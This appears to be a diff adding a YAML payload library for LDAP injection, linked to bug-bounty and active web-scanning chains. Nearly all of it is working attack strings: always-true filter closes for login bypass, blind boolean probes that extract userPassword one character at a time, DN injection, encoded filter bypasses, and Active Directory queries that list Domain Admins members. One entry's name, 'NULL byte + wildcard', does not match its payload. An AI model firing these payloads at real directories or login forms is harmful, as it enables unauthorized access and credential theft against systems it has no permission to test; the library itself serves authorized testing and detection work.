@@ -1,0 +1,202 @@
+id: ldap_injection
+name: LDAP Injection
+version: 1.0.0
+category: injection
+description: |
+  Payloads for LDAP search filter injection in authentication and search
+  endpoints. Includes always-true wildcards, attribute-disclosure tricks, blind
+  boolean extraction, and DN injection variants.
+mitre:
+  - T1190
+owasp_top10:
+  - A03:2021
+references:
+  - https://owasp.org/www-community/attacks/LDAP_Injection
+  - https://book.hacktricks.xyz/pentesting-web/ldap-injection
+  - https://portswigger.net/kb/issues/00100500_ldap-injection
+related_tools:
+  - nuclei
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: star_wildcard
+    name: Wildcard *
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "*"
+    notes: Matches all entries
+    source: https://owasp.org/www-community/attacks/LDAP_Injection
+  - id: always_true
+    name: Always-true close
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: critical
+    payload: "*)(uid=*"
+    notes: For (uid=$x) filter
+    source: https://book.hacktricks.xyz/pentesting-web/ldap-injection
+  - id: bypass_password
+    name: Password bypass
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: critical
+    payload: "*)(uid=*))(|(uid=*"
+    notes: For (&(uid=$u)(pw=$p))
+    source: https://book.hacktricks.xyz/pentesting-web/ldap-injection
+  - id: null_or_wildcard
+    name: NULL byte + wildcard
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "admin)(&)"
+    notes: Closes filter and forces AND-true
+    source: common knowledge
+  - id: admin_anything
+    name: admin)(password=*
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: critical
+    payload: "admin)(password=*"
+    notes: null
+    source: common knowledge
+  - id: blind_or_a
+    name: Blind boolean prefix a
+    subcategory: blind
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "*)(|(userPassword=a*"
+    notes: Iterate alphabet
+    source: common knowledge
+  - id: blind_or_b
+    name: Blind boolean prefix b
+    subcategory: blind
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "*)(|(userPassword=b*"
+    notes: null
+    source: common knowledge
+  - id: attribute_disclosure
+    name: Attribute disclosure
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "*)(objectClass=*"
+    notes: Reveals attribute names
+    source: common knowledge
+  - id: dn_injection_close
+    name: DN injection close
+    subcategory: dn_injection
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "uid=admin,ou=users,dc=example,dc=com)(uid=*"
+    notes: For raw DN sinks
+    source: common knowledge
+  - id: empty_filter
+    name: Empty filter
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: medium
+    payload: ""
+    notes: Some servers default to (objectClass=*)
+    source: common knowledge
+  - id: nested_or
+    name: Nested OR true
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "*)(|(uid=*)(uid=*))"
+    notes: null
+    source: common knowledge
+  - id: bind_dn_admin
+    name: Bind DN admin
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "cn=admin"
+    notes: For simple bind authn
+    source: common knowledge
+  - id: bind_anonymous
+    name: Anonymous bind
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: medium
+    payload: ""
+    notes: Empty DN + empty password
+    source: common knowledge
+  - id: url_encoded_paren
+    name: URL-encoded paren
+    subcategory: filter_bypass
+    encoding: url
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "%2a%29%28uid%3d%2a"
+    notes: null
+    source: common knowledge
+  - id: unicode_paren
+    name: Unicode FULL-WIDTH paren
+    subcategory: filter_bypass
+    encoding: unicode
+    tech_targets: [ldap]
+    severity_when_works: low
+    payload: "*）（uid=*"
+    notes: U+FF09/FF08; usually rejected, sometimes normalised
+    source: common knowledge
+  - id: ad_dollar_object
+    name: AD samAccountName wildcard
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [ldap, ad]
+    severity_when_works: high
+    payload: "(samAccountName=*)"
+    notes: null
+    source: common knowledge
+  - id: ad_member_disclosure
+    name: AD member disclosure
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [ldap, ad]
+    severity_when_works: medium
+    payload: "(&(objectCategory=person)(memberOf=cn=Domain Admins,*))"
+    notes: null
+    source: common knowledge
+  - id: filter_break_amp
+    name: Filter break with &
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "*))(&(objectClass=*"
+    notes: null
+    source: common knowledge
+  - id: timing_blind
+    name: Timing blind via search size limit
+    subcategory: blind
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: medium
+    payload: "*)(cn=*)(cn=*)(cn=*"
+    notes: Force slow expansion
+    source: common knowledge
+  - id: filter_inject_pipe
+    name: Pipe filter break
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [ldap]
+    severity_when_works: high
+    payload: "*)|(cn=*"
+    notes: null
+    source: common knowledge
